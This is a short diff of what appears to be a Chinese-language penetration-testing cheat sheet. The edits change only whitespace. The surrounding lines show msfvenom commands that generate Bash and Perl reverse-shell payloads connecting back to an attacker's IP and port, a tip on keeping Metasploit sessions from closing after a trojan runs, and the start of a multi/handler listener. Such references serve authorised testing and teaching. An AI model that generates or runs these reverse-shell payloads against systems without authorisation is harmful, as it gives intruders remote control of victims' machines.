@@ -290,8 +290,9 @@ Bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
 
 Perl
-msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl  
+msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
 ```  
+
 **关键参数：set exitonsessions false  防止有效荷载意外关闭（这个命令很有用，在渗透测试中，对方已经成功执行了你的木马，或者exploit攻击模块成功执行，会话已经建立，但是又突然意外关闭，这就是exitonsessions没有设置。）**  
 ```
 use exploit/multi/handler
